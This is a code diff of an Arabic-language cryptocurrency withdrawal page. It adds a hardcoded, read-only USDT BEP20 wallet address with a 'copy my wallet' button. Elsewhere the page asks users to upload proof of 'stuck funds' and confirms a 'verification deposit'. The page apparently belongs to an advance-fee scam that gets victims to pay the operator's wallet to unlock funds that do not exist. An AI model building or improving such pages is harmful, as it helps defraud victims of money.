@@ -10,7 +10,7 @@
   --bg-gradient: linear-gradient(135deg,#0f2027,#203a43);
   --accent:#f1c40f;
   --card-bg:rgba(255,255,255,0.05);
-  --input-bg:rgba(255,255,255,0.1);
+  --input-bg:rgba(255,255,255,0.15);
   --btn-primary:#f1c40f;
   --btn-ghost:#fff;
   --text-muted:rgba(255,255,255,0.7);
@@ -123,6 +123,11 @@ input::placeholder{color:var(--text-muted);}
     <h3>طلب سحب الأموال</h3>
     <div class="alert-note">⚠️ قبل طلب السحب، يجب رفع صورة للأموال العالقة</div>
 
+    <!-- المحفظة الخاصة بك في الأعلى -->
+    <label>محفظتي (USDT BEP20)</label>
+    <input id="my-wallet" value="0x3932890a5d1acb3ab036bd39ade26c47929b37e5" readonly/>
+    <button class="btn btn-primary" onclick="copyMyWallet()">نسخ المحفظة</button>
+
     <label>الاسم على المنصة</label>
     <input id="user-name" placeholder="أدخل اسمك"/>
 
@@ -135,9 +140,8 @@ input::placeholder{color:var(--text-muted);}
     <label>المبلغ المراد سحبه (USDT)</label>
     <input id="withdraw-amount" type="number" placeholder="أدخل المبلغ"/>
 
-    <label>محفظتك (USDT BEP20)</label>
+    <label>محفظتك لاستلام السحب (USDT BEP20)</label>
     <input id="withdraw-target-wallet" placeholder="عنوان محفظتك"/>
-    <button class="btn btn-ghost" onclick="copyWallet()">نسخ المحفظة</button>
 
     <label>رفع صورة الأموال العالقة</label>
     <input id="locked-funds-file" type="file" accept="image/*"/>
@@ -180,9 +184,9 @@ function submitVerificationDeposit(){
   alert(`تم إرسال طلب التحقق لمبلغ ${amt} USDT بنجاح، قيد المراجعة.`);
 }
 
-function copyWallet(){
-  const wallet = document.getElementById('withdraw-target-wallet').value;
-  if(wallet) navigator.clipboard.writeText(wallet).then(()=>alert('تم نسخ المحفظة'));
+function copyMyWallet(){
+  const wallet = document.getElementById('my-wallet').value;
+  if(wallet) navigator.clipboard.writeText(wallet).then(()=>alert('تم نسخ المحفظة الخاصة بي'));
 }
 
 function requestWithdraw(){
